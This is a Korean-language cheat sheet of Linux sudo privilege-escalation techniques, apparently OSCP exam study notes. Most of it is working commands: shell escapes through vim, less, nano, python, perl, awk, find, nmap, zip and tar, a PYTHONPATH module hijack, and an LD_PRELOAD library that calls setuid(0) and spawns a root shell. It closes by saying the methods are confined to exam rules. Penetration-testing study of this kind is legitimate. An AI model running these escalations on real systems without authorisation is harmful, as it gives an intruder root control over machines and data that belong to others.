# sudo 권한 상승

## 권한 확인

```bash
sudo -l        # 현재 사용자의 sudo 권한 확인 (필수)
sudo -V        # sudo 버전 확인 (CVE 취약점 확인용)
```

## 주요 출력 형태

```
# 모든 명령어 실행 가능 (비밀번호 필요)
(ALL : ALL) ALL

# 모든 명령어 실행 가능 (비밀번호 불필요)
(ALL) NOPASSWD: ALL

# 특정 명령어만 실행 가능 (비밀번호 불필요)
(ALL) NOPASSWD: /usr/bin/vim, /bin/bash

# 특정 사용자로 실행
(www-data) NOPASSWD: /usr/bin/python

# 환경변수 설정 허용
(ALL) SETENV: NOPASSWD: /usr/bin/python
```

## 바이너리별 권한 상승 기법

### 편집기/뷰어 활용

```bash
# vim
sudo vim -c ':!/bin/bash'
sudo vim
:set shell=/bin/bash
:shell

# less / more / man
sudo less /etc/hosts
!/bin/bash

# nano
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

### 프로그래밍/스크립팅 도구

```bash
# python
sudo python -c 'import os; os.system("/bin/bash")'
sudo python -c 'import pty; pty.spawn("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# lua
sudo lua -e 'os.execute("/bin/bash")'

# awk
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 파일/명령어 실행 도구

```bash
# find
sudo find / -name test -exec /bin/bash \; -quit

# nmap (대화형 모드)
sudo nmap --interactive
!sh

# zip/unzip
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### 환경 변수 활용

```bash
# PYTHONPATH 활용 (모듈 하이재킹)
cd /tmp
echo 'import os; os.system("/bin/bash")' > os.py
sudo PYTHONPATH=/tmp python -c 'import os'

# LD_PRELOAD 활용
cat > /tmp/root.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { setuid(0); system("/bin/bash"); }
EOF
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so find
```

1. **쉘 직접 접근 명령어**: `/bin/bash`, `/bin/sh` 등이 있으면 직접 쉘 획득 가능
2. **인터프리터**: `python`, `perl`, `ruby` 등이 있으면 코드 실행을 통해 쉘 획득 가능
3. **텍스트 편집기**: `vim`, `nano`, `emacs` 등이 있으면 쉘 명령어 실행 기능을 통해 쉘 획득 가능
4. **파일 검색/조작 도구**: `find`, `awk`, `sed` 등이 있으면 명령어 실행 옵션을 통해 쉘 획득 가능
5. **기타 유틸리티**: `tar`, `zip`, `man`, `less` 등이 있으면 내부 명령어 실행 기능을 통해 쉘 획득 가능

### 주요 확인 사항

- 명령어 앞에 경로(`/usr/bin/`)가 있는지 확인 -> 전체 경로가 지정되어 있으면 해당 바이너리만 실행 가능
- 와일드카드(`*`)가 있는지 확인 -> 추가 옵션이나 인자 전달 가능성
- 환경 변수 설정이 가능한지 확인 -> `LD_PRELOAD`, `LD_LIBRARY_PATH` 등을 이용한 권한 상승 가능성

## 3. 대표적인 권한 상승 예시

### (1) /bin/bash 실행 권한이 있을 때

```bash
sudo /bin/bash
```

### (2) python이 있을 때

```bash
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

### (3) vi/vim이 있을 때

```bash
sudo vim -c ':!/bin/bash'
```

### (4) find가 있을 때

```bash
sudo find . -exec /bin/bash \; -quit
```

### (5) tar가 있을 때

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### (6) less가 있을 때

```bash
sudo less /etc/hosts
!bash
```

## 4. GTFOBins 참고

- [https://gtfobins.github.io/](https://gtfobins.github.io/) 에서 sudo 권한이 있는 바이너리의 권한 상승 방법을 확인할 수 있습니다.

## 5. 주의사항

- OSCP 시험에서는 root shell 획득 후 바로 증거(flag) 파일을 확인하고, 추가적인 파괴적 행위는 금지됩니다.
- 모든 권한 상승 시도는 시험 규정 내에서만 진행해야 합니다.

---

> 위 내용은 OSCP 시험에서 허용되는 수동 침투 방법만을 다룹니다.
